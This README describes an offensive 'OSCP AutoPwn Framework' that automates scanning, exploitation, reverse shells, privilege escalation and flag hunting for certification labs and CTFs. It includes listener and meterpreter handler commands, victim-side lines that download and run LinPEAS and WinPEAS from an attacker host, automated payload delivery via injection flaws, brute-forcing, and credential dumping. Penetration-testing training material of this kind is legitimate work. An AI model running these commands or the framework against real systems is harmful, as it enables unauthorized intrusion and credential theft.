# 🔴 OSCP AutoPwn Framework

> **⚠️ AUTHORIZED LAB USE ONLY** — This tool is exclusively for OSCP labs, CTF competitions,
> and systems you own or have explicit written permission to test.
> Unauthorized use is a criminal offense. The author assumes no liability for misuse.

---

## 📁 Project Structure

```
oscp_framework/
├── main.py                    # CLI entry point (Typer + Rich)
├── install.sh                 # Automated installer
├── requirements.txt           # Python dependencies
├── config/
│   └── default.yaml           # Default configuration
├── modules/
│   ├── __init__.py
│   ├── utils.py               # Shared utilities, async command runner
│   ├── config_manager.py      # Config loading + exploit/privesc maps
│   ├── session_manager.py     # State save/resume (JSON)
│   ├── recon.py               # Phase 1: Nmap, web, SMB, FTP, DB enum
│   ├── exploit.py             # Phase 2: Searchsploit, nuclei, MSF, web vulns
│   ├── shell_handler.py       # Phase 3: Payloads, listeners, delivery
│   ├── privesc.py             # Phase 4: LinPEAS/WinPEAS, PrivEsc commands
│   ├── flag_hunter.py         # Phase 5: Flag search, hash cracking
│   └── reporter.py            # HTML + JSON report generation
├── wordlists/                 # Custom wordlists (place here)
├── output/                    # All scan output (auto-created)
│   └── <target_ip>/
│       ├── .state.json        # Resume state
│       ├── nmap/              # Nmap output files
│       ├── web/               # gobuster, nikto, whatweb results
│       ├── smb/               # enum4linux, smbclient, CME results
│       ├── ftp/ ssh/          # Service-specific enum
│       ├── exploits/          # searchsploit, nuclei, MSF scripts
│       ├── shells/            # msfvenom payloads, revshell commands
│       ├── privesc/           # LinPEAS/WinPEAS, manual check scripts
│       └── flags/             # Flag hunt commands, discovered flags
└── logs/
    └── autopwn.log            # Full timestamped log
```

---

## ⚙️ Installation

```bash
# Clone or download the framework
cd oscp_framework/

# Run installer (Kali Linux / Parrot OS recommended)
sudo bash install.sh

# Or manually install Python deps:
pip3 install -r requirements.txt
```

### Manual Tool Installation (if needed)

```bash
# Kali one-liner (most tools pre-installed):
sudo apt install -y nmap gobuster ffuf nikto whatweb enum4linux smbclient \
  crackmapexec exploitdb metasploit-framework hydra hashcat john \
  netcat-traditional curl wget rlwrap

# nuclei:
go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# enum4linux-ng:
pip3 install enum4linux-ng

# SecLists:
sudo apt install seclists
# or: git clone https://github.com/danielmiessler/SecLists /usr/share/seclists
```

---

## 🚀 Usage

### Basic Usage

```bash
# Single target — full pipeline
python3 main.py 10.10.10.5

# With known LHOST (auto-detects tun0 by default)
python3 main.py 10.10.10.5 --lhost 10.10.14.1 --lport 4444

# With domain and credentials
python3 main.py 10.10.10.5 --domain corp.local --user admin --pass Password1
```

### Phase Selection

```bash
# Only recon
python3 main.py 10.10.10.5 --phases recon

# Recon + exploit only
python3 main.py 10.10.10.5 --phases recon,exploit

# Skip recon (if already done), run exploit + shell + privesc
python3 main.py 10.10.10.5 --phases exploit,shell,privesc,flags --resume
```

### Multiple Targets

```bash
# CIDR range
python3 main.py 10.10.10.0/24 --phases recon

# File with IPs (one per line)
python3 main.py targets.txt --phases recon,exploit
```

### Config File

```bash
# Use custom config
python3 main.py 10.10.10.5 --config config/mylab.yaml

# Custom wordlist
python3 main.py 10.10.10.5 --wordlist /path/to/wordlist.txt
```

### Safety Modes

```bash
# Dry-run (shows what WOULD be done, no execution)
python3 main.py 10.10.10.5 --dry-run

# Resume interrupted scan
python3 main.py 10.10.10.5 --resume

# Disable Metasploit
python3 main.py 10.10.10.5 --no-msf

# Verbose output
python3 main.py 10.10.10.5 --verbose
```

---

## 🔄 Full Pipeline

```
Phase 1: RECON
├── nmap -p- --min-rate 1000 (all ports, fast)
├── nmap -sV -sC --script=vulners,smb-os-discovery,... (full)
├── HTTP: gobuster + ffuf + nikto + whatweb + manual checks
├── SMB:  enum4linux-ng + smbclient + crackmapexec
├── FTP:  anonymous login test
├── SSH:  banner + auth methods
├── DBs:  MySQL/Redis/Mongo/MSSQL basic exposure
└── Save: nmap/, web/, smb/, ssh/, ftp/ directories

Phase 2: EXPLOIT
├── searchsploit (service/version → Exploit-DB)
├── nuclei (template-based vuln scan)
├── MSF module matching (CVE → metasploit module)
│   └── Auto-generates .rc resource script
├── Web: SQLi, LFI/RFI, Command Injection tests
├── hydra brute-force (SSH/FTP/SMB with rockyou)
└── Save: exploits/ directory + autopwn.rc

Phase 3: SHELL
├── msfvenom payloads (EXE, ELF, PHP, PS1, ASPX)
├── Reverse shell one-liners (bash/python/php/perl/nc/ps)
├── Listener setup instructions (nc, msfconsole)
├── Automated delivery via CMDI/LFI vectors
├── Shell stabilization guide (pty upgrade)
└── Save: shells/ directory

Phase 4: PRIVESC
├── Download LinPEAS + linux-exploit-suggester
├── Download WinPEAS
├── Generate manual checklist (SUID, sudo, cron, etc.)
├── Windows: JuicyPotato/PrintSpoofer/AlwaysInstallElevated guides
├── Mimikatz + LaZagne credential dumping commands
├── Kernel exploit references
└── Save: privesc/ directory + GUIDE.md

Phase 5: FLAGS
├── OS-appropriate flag search commands
├── Recursive find commands for all OSCP flag filenames
├── Hash identification + hashcat/john cracking guide
├── Auto-scan existing output for flag patterns
└── Save: flags/ directory + FOUND_FLAGS.txt
```

---

## 🏆 OSCP Lab Tips

### 1. Start Your Listener Early
```bash
# Terminal 1: Start listener BEFORE running the framework
rlwrap nc -lvnp 4444

# Or multi/handler for meterpreter:
msfconsole -q -x "use multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; \
  set LHOST tun0; set LPORT 4444; run -j"
```

### 2. Serve Files to Victim
```bash
# Start Python HTTP server in your output directory:
cd output/10.10.10.5/
python3 -m http.server 8000

# On victim (Linux):
wget http://YOUR_IP:8000/privesc/linux/linpeas.sh -O /tmp/lp.sh && bash /tmp/lp.sh

# On victim (Windows):
certutil -urlcache -split -f http://YOUR_IP:8000/privesc/windows/winpeas.exe C:\Windows\Temp\wp.exe
```

### 3. Shell Stabilization
```bash
# After catching a shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
stty rows 50 cols 200
```

### 4. Common OSCP Machine Patterns

| Machine Type | Key Checks |
|---|---|
| Windows SMB  | EternalBlue (MS17-010), MS08-067, null sessions |
| Windows IIS  | WebDAV, ASPX upload, MS14-070 |
| Linux Web    | LFI→RCE, SQLi, SSTI, command injection |
| Linux SSH    | Weak creds, key reuse, version exploits |
| AD machines  | Kerberoasting, ASREPRoasting, BloodHound |
| FTP exposed  | Anonymous login, version exploits |

### 5. Manual Steps the Framework Can't Do

The framework **generates commands for you** — some still need manual execution:

1. **Catching the shell** — you must have a listener ready
2. **Running PrivEsc scripts on victim** — copy from `privesc/` and run inside shell
3. **Reading flags** — use commands from `flags/flag_hunt_commands.txt`
4. **Interactive MSF sessions** — framework generates `.rc` scripts, you execute them

---

## 🔧 Extending the Framework

### Add a New Exploit Module

Edit `modules/config_manager.py` → `EXPLOIT_HINTS`:
```python
"my_cve": {
    "msf": "exploit/multi/handler/my_module",
    "standalone": "exploits/my_exploit.py",
    "ports": [8080],
    "name": "My Custom CVE",
},
```

### Add a New Service Scanner

Edit `modules/recon.py` → `ReconModule.run()`:
```python
elif svc == "myservice" or port == 9999:
    tasks.append(self._enum_myservice(port))
```

Then add:
```python
async def _enum_myservice(self, port: int):
    # Your enumeration logic
    pass
```

### Add a PrivEsc Technique

Edit `modules/privesc.py` → `_generate_manual_linux_checks()`:
Add your commands to the `checks` dict.

---

## 📦 Dependencies

### Python Packages
- `typer` — CLI framework
- `rich` — Terminal UI (colors, progress, tables)
- `pyyaml` — Config file parsing
- `netifaces` — Network interface detection

### External Tools (auto-installed by `install.sh`)
- `nmap` — Port scanning
- `gobuster` / `ffuf` — Directory brute-forcing
- `nikto` — Web vulnerability scanner
- `whatweb` — Web tech fingerprinting
- `enum4linux-ng` — SMB enumeration
- `smbclient` — SMB client
- `crackmapexec` — Windows/SMB exploitation
- `searchsploit` — Exploit-DB search
- `metasploit-framework` — Exploitation framework
- `msfvenom` — Payload generator
- `nuclei` — Template-based scanner
- `hydra` — Password brute-forcer
- `hashcat` — GPU hash cracker
- `john` — Password cracker

---

## ⚠️ Legal Disclaimer

This tool is provided for **educational purposes** and **authorized security testing only**.

- Only use against systems you **own** or have **explicit written authorization** to test
- OSCP lab machines (Offensive Security Lab / PG Practice / HTB / TryHackMe)
- CTF competitions where you're an authorized participant

**Unauthorized use constitutes a criminal offense** under the Computer Fraud and Abuse Act (CFAA),
Computer Misuse Act, and equivalent laws in most jurisdictions worldwide.

The author assumes **no liability** for misuse of this tool.
